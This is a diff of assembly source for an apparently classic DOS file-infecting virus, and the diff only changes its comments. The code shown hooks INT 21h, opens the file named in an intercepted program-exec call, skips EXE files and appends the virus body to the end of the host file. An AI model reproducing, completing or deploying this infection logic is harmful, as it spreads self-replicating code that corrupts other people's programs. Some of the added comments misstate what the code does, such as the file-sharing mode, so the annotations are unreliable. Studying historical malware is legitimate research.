@@ -47,7 +47,8 @@ copy_in_memory:
             mov cx,k_unused_memory_segment
             mov es,cx
             xor di,di
-            lea si,[bx+100h]                  ; = virus_start; 100h = virus_start - (entry_point-(jmp_to_entry_point+2))
+            lea si,[bx+100h]                  ; virus_start; 100h = virus_start - (entry_point-(jmp_to_entry_point+2))
+                                              ; BX contains file offset, +100h converts to CS offset
             mov cl,virus_end - virus_start
             cld
             rep movsb
@@ -88,7 +89,8 @@ new_int21:
             push cx
             push ds
 
-            mov ax,3D92h                      ; open for r/w, with some exotic (and useless) sharing attributes
+            mov ax,3D92h                      ; open for r/w, deny-write sharing mode, no inherit
+                                              ; DX points to filename from intercepted INT 21h/4Bh call
             int 21h
             mov bx,ax
             call word move_to_file_start
@@ -102,7 +104,7 @@ new_int21:
             cmp byte [host_original_header-virus_start], 'M' ; is it an EXE file?
             jz short close_file
             mov al,2
-            call word move_file_pointer_partial_call ; ax=4202h - move to file end
+            call word move_file_pointer_partial_call ; ah=42h set by callee, al=2 (ax=4202h) - move to file end
             mov [virus_start_jmp_address - virus_start],ax
             mov cx,virus_end - virus_start
             call word write_to_file
@@ -135,7 +137,7 @@ move_file_pointer_partial_call:
             mov ah,42h
 
 int21_partial_call:
-            xor dx,dx
+            xor dx,dx                         ; ensures writes start from DS:0
             int 21h
             ret
 
